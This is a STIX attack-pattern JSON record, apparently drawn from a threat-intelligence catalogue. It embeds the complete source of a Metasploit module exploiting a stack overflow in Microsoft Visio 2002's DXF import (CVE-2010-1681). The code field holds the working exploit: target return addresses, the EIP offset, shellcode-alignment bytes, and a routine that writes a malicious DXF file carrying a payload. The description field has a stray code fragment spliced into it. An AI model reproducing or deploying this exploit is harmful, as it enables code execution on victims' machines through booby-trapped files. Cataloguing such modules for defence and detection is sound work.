{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--40e58eae-ae14-4048-8ab2-4b7db448ccce",
    "created": "2024-08-14T16:37:42.482444Z",
    "modified": "2024-08-14T16:37:42.482448Z",
    "name": "Microsoft Office Visio VISIODWG.DLL DXF File Handling Vulnerability",
    "description": " This module exploits a stack based overflow vulnerability in the handling of the DXF files by Microsoft Visio 2002. Revisions prior to the release of the MS bulletin MS10-028 are vulnerable. The overflow occurs when the application is used to import a specially crafted DXF file, while parsing the HEADER section of the DXF file.  To trigger the vulnerability an attacker must convince someone to insert a specially crafted DXF file to a new document, go to 'Insert' -> 'CAD Drawing'  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/visio_dxf_bof.rb",
            "external_id": "visio_dxf_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/ms-visio-dxf-buffer-overflow"
        },
        {
            "source_name": "reference",
            "url": "https://www.exploit-db.com/moaub-8-microsoft-office-visio-dxf-file-stack-overflow/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Office Visio VISIODWG.DLL DXF File Handling Vulnerability',\n      'Description'    => %q{\n          This module exploits a stack based overflow vulnerability in the handling\n        of the DXF files by Microsoft Visio 2002. Revisions prior to the release of\n        the MS bulletin MS10-028 are vulnerable. The overflow occurs when the application\n        is used to import a specially crafted DXF file, while parsing the HEADER section\n        of the DXF file.\n\n        To trigger the vulnerability an attacker must convince someone to insert a\n        specially crafted DXF file to a new document, go to 'Insert' -> 'CAD Drawing'\n        },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # CORE Security, original discovery\n          'Shahin Ramezany <shahin[at]abysssec.com>', # MOAUB #8 exploit and binary analysis\n          'juan vazquez', # metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE','2010-1681' ],\n          [ 'OSVDB', '64446' ],\n          [ 'BID', '39836' ],\n          [ 'URL', 'http://www.coresecurity.com/content/ms-visio-dxf-buffer-overflow' ],\n          [ 'URL', 'https://www.exploit-db.com/moaub-8-microsoft-office-visio-dxf-file-stack-overflow/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload' =>\n        {\n          'Space'         => 2000,\n          'BadChars'      => Rex::Text.charset_exclude(Rex::Text::AlphaNumeric),\n          'DisableNops'   => true, # no need\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX'\n            }\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Microsoft Office Visio 2002\n          # VISIO.EXE v10.0.525.4\n          # VISIODWG.DLL v10.0.525.4\n          # ECXAdjust:\n          # 0x8 => ESP points to the prepended shellcode\n          # 0x1A => Padding\n          # 0x2 => len(push esp, pop ecx)\n          # 0x3 => len(sub)\n          # 0x6 => len(add)\n          [\n            'Visio 2002 English on Windows XP SP3 Spanish',\n            {\n              'Ret'         => 0x6173345c, # push esp, ret from VISIODWG.DLL\n              'Offset'      => 0x50,       # EIP\n              'ReadAddress' => 0x617a4748, # points to VISIODWG.DLL data segment\n              'ECXAdjust'   => 0x2D\n            }\n          ],\n          [\n            'Visio 2002 English on Windows XP SP3 English',\n            {\n              'Ret'         => 0x60455F6B, # push esp, ret from VISLIB.DLL\n              'Offset'      => 0x50,       # EIP\n              'ReadAddress' => 0x66852040, # points to VISIODWG.DLL data segment\n              'ECXAdjust'   => 0x2D,\n            }\n          ],\n        ],\n      'DisclosureDate' => '2010-05-04'))\n\n    register_options(\n      [\n        OptString.new('FILENAME',   [ true, 'The file name.',  'msf.dxf']),\n      ])\n  end\n\n  def exploit\n    content = \"0\\n\"\n    content << \"SECTION\\n\"\n    content << \"2\\n\"\n    content << \"HEADER\\n\"\n    content << \"9\\n\"\n    content << \"$ACADMAINTVER\"\n    content << rand_text_alpha(target['Offset'] - \"ACADMAINTVER\".length)\n    content << [target.ret].pack('V') # new ret\n    content << \"\\xeb\\x20\\x90\\x90\" # short jmp to payload (plus two padding nops)\n    content << [target['ReadAddress']].pack('V') # readable address to avoid exceptions\n    content << rand_text_alpha(0x1A) # jumped by the short jump\n    # Get in ECX a pointer to the shellcode start\n    content << \"\\x54\" # push esp\n    content << \"\\x59\" # pop ecx\n    # ecx adjustment\n    content << Rex::Arch::X86.sub(-(target['ECXAdjust']),Rex::Arch::X86::ECX, \"\\x00\\x0d\\x0a\", false, true)\n    # Stack adjustment\n    content << \"\\x81\\xc4\\x48\\xf4\\xff\\xff\" # add esp, -3000\n    content << payload.encoded\n    content << \"\\n\"\n    content << \"0\\n\"\n    content << \"ENDSEC\\n\"\n    content << \"0\\n\"\n    content << \"EOF\\n\"\n\n    print_status(\"Creating #{datastore['FILENAME']} ...\")\n    file_create(content)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-05-04",
    "x_mitre_platforms": [
        "win'"
    ]
}